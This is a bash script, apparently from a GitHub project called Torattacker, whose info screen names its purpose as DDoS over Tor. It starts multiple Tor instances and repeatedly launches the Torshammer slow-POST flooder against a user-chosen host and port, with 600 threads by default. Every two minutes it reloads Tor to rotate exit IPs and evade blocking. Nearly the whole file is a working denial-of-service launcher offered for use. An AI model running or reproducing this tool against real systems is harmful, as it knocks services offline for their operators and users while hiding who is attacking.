#!/usr/bin/bash
# Torattacker
# Coded by Hoxage
# Github: https://github.com/hoxage/Torattacker

trap 'echo;stop;exit 1;' 2
checkroot(){
if [[ "$(id -u)" -ne 0 ]]; then
   printf "\e[0m[\e[1;91m!\e[0m] \e[1;77mPlease, run this program as root!\n\n\e[0m"
   exit 1
fi
}
clearscreen(){
    clear
    reset
    sleep 1
}
dependencies(){
    command -v bash > /dev/null 2>&1 || { echo >&2 "I require bash but it's not installed. Jalankan ./install.sh it aborting."; exit 1; }
    command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Jalankan ./install.sh it aborting."; exit 1; }
    command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Jalankan ./install.sh it aborting."; exit 1; }
    command -v openssl > /dev/null 2>&1 || { echo >&2 "I require openssl but it's not installed. Jalankan ./install.sh it aborting."; exit 1; }
    command -v tor > /dev/null 2>&1 || { echo >&2 "I require tor but it's not installed. Jalankan ./install.sh it aborting."; exit 1; }
    command -v python2 > /dev/null 2>&1 || { echo >&2 "I require python2 but it's not installed. Jalankan ./install.sh it aborting."; exit 1; }
    command -v git > /dev/null 2>&1 || { echo >&2 "I require git but it's not installed. Jalankan ./install.sh it aborting."; exit 1; }
    if [ $(ls /dev/urandom >/dev/null; echo $?) == "1" ]; then
        echo "/dev/urandom not found!"
    exit 1
fi
}
load(){
    echo -e "\n"
    bar=" >>>>>>>>>>>>>>>>>>> "
    barlength=${#bar}
    i=0
    while((i<100)); do
        n=$((i*barlength / 100))
        printf "\r\e[0m[\e[1;32m%-${barlength}s\e[0m]\e[00m" "${bar:0:n}"
        printf "  \e[1;77mLoading...!\e[0m "
        ((i += RANDOM%5+2))
        sleep 0.2
    done
}
changeip(){
    killall -HUP tor
}
banner() {
    echo
    printf "\e[1;35m ▄▄▄▄▄▄▄▄     \e[1;92m█▀\e[0m\n"
    printf "\e[1;35m ▀▀▀██▀▀▀   ▄████▄    ██▄████ \e[0m\e[1;77m  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\e[0m\n"
    printf "\e[1;35m    ██     ██▀\e[1;37\e[0m██\e[1;95m▀██   ██▀     \e[0m\e[1;77m  ░░░\e[1;91m█▀█\e[0m\e[1;77m░\e[1;91m▀█▀\e[0m\e[1;77m░\e[1;91m▀█▀\e[0m\e[1;77m░\e[1;91m█▀█\e[0m\e[1;77m░\e[1;91m█▀▀\e[0m\e[1;77m░\e[1;91m█\e[0m\e[1;77m░\e[1;91m█\e[0m\e[1;77m░░░\e[0m\n"
    printf "\e[1;35m    ██     ██\e[1;37\e[0m████\e[1;95m██   ██      \e[0m\e[1;77m  ░░░\e[1;91m█▀█\e[0m\e[1;77m░░\e[1;91m█\e[0m\e[1;77m░░░\e[1;91m█\e[0m\e[1;77m░░\e[1;91m█▀█\e[0m\e[1;77m░\e[1;91m█\e[0m\e[1;77m░░░\e[1;91m█▀▄\e[0m\e[1;77m░░░\e[0m\n"
    printf "\e[1;35m    ██     ▀██▄▄██▀   ██      \e[0m\e[1;77m  ░░░\e[1;91m▀\e[0m\e[1;77m░\e[1;91m▀\e[0m\e[1;77m░░\e[1;91m▀\e[0m\e[1;77m░░░\e[1;91m▀\e[0m\e[1;77m░░\e[1;91m▀\e[0m\e[1;77m░\e[1;91m▀\e[0m\e[1;77m░\e[1;91m▀▀▀\e[0m\e[1;77m░\e[1;91m▀\e[0m\e[1;77m░\e[1;91m▀\e[0m\e[1;77m░░░\e[0m\n"
    printf "\e[1;35m    ▀▀       ▀▀▀▀     ▀▀      \e[0m\e[1;77m  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\e[0m\n"
    echo
    printf "\e[0;100;97;1m[              Torattacker, My Github: @hoxage              ]\e[0m\n"
}
config(){
    clearscreen
    banner
    printf "\n\e[0m[ \033[32mINFO \e[0m] \033[3mTurn on Tor connection before the usage\e[0m\n\n\n"
    default_portt="80"
    default_threads="600"
    default_tor="y"
        read -p $'\e[0m[\e[41;77;1m Hoastname \e[0m] ' target
            read -p $'\e[0m[\e[42;90;1m   Ports   \e[0m] ' portt
            portt="${portt:-${default_portt}}"
                read -p $'\e[0m[\e[43;90;1m  Threads  \e[0m] ' threads
                threads="${threads:-${default_threads}}"
                    read -p $'\e[0m[\e[44;77;1m  Command  \e[0m] ' inst
                    inst="${inst:-${default_inst}}"
                        read -e -p $'\e[0m[\e[45;77;1m    TOR    \e[0m] ' tor
                            printf "\e[0m"
                            tor="${tor:-${default_tor}}"
        if [[ $tor == "y" || $tor == "Y" ]]; then
        readinst
        printf "\e[0m[\e[1;91m!\e[0m] \e[1;77mPress Ctrl + c to stopped\n"
        attacktor
    else
        attack
        fi
}
readinst(){
    default_inst="3"
    read -p $'\e[0m[\e[46;90;1m  Instant  \e[0m] ' inst
        inst="${inst:-${default_inst}}"
        multitor
}
attacktor(){
    while true; do
        let ii=1
        while [ $ii -le $inst ]; do
            porttor=$((9050+$ii))
            gnome-terminal -- torsocks -P $porttor python torshammer/torshammer.py -t $target -p $portt -r $threads
            ii=$((ii+1))
        done
        sleep 120
        changeip
        let i=1
        let porttor=$((9050+$i))
    done
}
attack(){
    default_inst="4"
        read -p $'\e[0m[\e[44;77;1m  Command  \e[0m] ' inst
            inst="${inst:-${default_inst}}"
            printf "\e[0m[\e[1;91m!\e[0m] \e[1;77mPress Ctrl + c to stopped\n"
            i=1
        while true; do
            let i=1
            while [[ $i -le $inst ]]; do
                gnome-terminal -- python torshammer/torshammer.py -t $target -p $portt -r $threads
                i=$((i+1))
            done
            sleep 120
            killall python
        done
}
checktor(){
    echo
    let i=1
    checkcount=0
        while [[ $i -le $inst ]]; do
            port=$((9050+$i))
            printf "\e[0mChecking Tor connection on port:\e[77;1m %s\e[77;1m..." $port
            check=$(curl --socks5-hostname localhost:$port -s https://www.google.com > /dev/null; echo $?)
            if [[ "$check" -gt 0 ]]; then
                printf "\e[77;1mFailed!\n"
            else
                printf "\e[77;1mOkay!\n"
                let checkcount++
            fi
            i=$((i+1))
        done

    if [[ $checkcount != $inst ]]; then
        echo
        printf "\e[0m[\e[1;96;2m1\e[0m] \e[1;77mRestart all Tor!\n"
        printf "\e[0m[\e[1;96;2m2\e[0m] \e[1;77mCheck again\n"
        printf "\e[0m[\e[1;96;2m3\e[0m] \e[1;77mRestart\n"
        printf "\e[0m[\e[1;96;2m0\e[0m] \e[1;77mExit\n"
        echo
        read -p $'\e[0m[\e[1;95m/\e[0m] \e[1;77mChoose an option: \e[0m' fail
            if [[ $fail == '1' ]]; then
            checktor
                elif [[ $fail == '2' ]]; then
                stop
                multitor
                    elif [[ $fail == '3' ]]; then
                    clear
                    clearscreen
                    banner
                    menu
                        elif [[ $fail == '0' ]]; then
                        echo
                        printf "\e[0m[\e[1;91m!\e[0m] \e[1;77mExit the program!\n"
                        echo
                        exit 1
            else
            echo
            printf "\e[0m[=\e[1;41;77m Invalid Option \e[0m=]"
            echo
            sleep 1
            clear
            banner
            config
        fi
    fi
}
multitor(){
    echo
    printf "\e[0m[\e[31m●\e[0m] \e[77;1mProcessing ...\033[0m"
    sleep 3
    echo
    echo
    if [[ ! -d multitor ]]; then
        mkdir multitor;
    fi
    default_ins="1"
    inst="${inst:-${default_inst}}"
    let i=1
        while [[ $i -le $inst ]]; do
            port=$((9050+$i))
            printf "SOCKS Port %s\nData Directory /var/lib/tor%s" $port $i > multitor/multitor$i.
            printf "\e[0mStarting Tor on port:\e[77;1m 905%s\e[77;1m\n" $i.
            tor -f multitor/multitor$i > /dev/null &
            sleep 10
            i=$((i+1))
    done
checktor
}
stop(){
    killall -2 tor > /dev/null 2>&1
    echo
    printf "\e[0m[\e[1;91m!\e[0m] \e[1;77mAll Tor connection stopped.\e[0m\n"
    echo
}
menu(){
    echo
    printf "\033[0m[\033[1;96;2m1\033[0m] \033[1;77mStarted Torattacker\n"
    echo
    printf "\033[0m[\033[93;1m&\033[0m] LICENSE\n"
    printf "\033[0m[\033[94;1m#\033[0m] Information\n"
    printf "\033[0m[\033[92;1m*\033[0m] Update\n"
    printf "\033[0m[\033[91;1m-\033[0m] Exit\n"
    echo
        read -p $'\e[0m(\e[105;77;1m/\e[0m) \e[1;77mChoose an option: \e[0m' option
            if [[ $option == '1' ]]; then
            printf "\n\e[0m[\e[32m●\e[0m] \e[77;1mProcessong ...\e[0m\n"
            sleep 1
            config
                elif [[ $option == '2' || $option == '&' ]]; then
                echo
                nano LICENSE
                echo
                clearscreen
                banner
                menu
                    elif [[ $option == '3' || $option == '#' ]]; then
                    echo
                    informasi
                    echo
                        elif [[ $option == '4' || $option == '*' ]]; then
                        echo
                        git pull origin master
                        echo
                        read -p $'\e[0m[\e[32m Press Enter \e[0m]'
                        clearscreen
                        banner
                        menu
                            elif [[ $option == '5' || $option == '-' ]]; then
                            echo
                            printf "\e[0m[\e[1;91m!\e[0m] \e[0;1;77mExit the program!\n\e[0m"
                            echo
                            exit 1
            else
                echo
                printf "\e[0m[=\e[1;41;77m Invalid Optiom \e[0m=]"
                echo
                sleep 1
                clearscreen
                banner
                menu
        fi
}
informasi(){
clear
printf "\e[0;100;77;1m[             Torattacker, My Github: @hoxage              ]\e[0m\n"
toilet -f smslant 'Tor'
printf "
Name        : Torattacker
Version     : 1.0 (Update: 23 February 2020, 9:30 AM)
Date        : 12 August 2019
Author      : Nedi Senja
Purpose     : Ddos usage Tor connection
              or Anonymouse
Terimakasih : Allah SWT.
              FR13NDS, & all over
              humans on planet earth
NB          : Humans are not perfect
              as rich as this tool.
              Please report criticism or suggestions
              To - Email: d_q16x@outlook.co.id
                 - WhatsApp: https://tinyurl.com/wel4alo

[ \e[4mUse this tool wisely. Thanks \e[0m]\n"
sleep 1
read -p $'\n\n\e[0m[ Press Enter ]' opt
    if [[ $opt = '' ]]; then
        clearscreen
        banner
        menu
    fi
}
#checkroot
#checktor
#dependencies
    clearscreen
    banner
    menu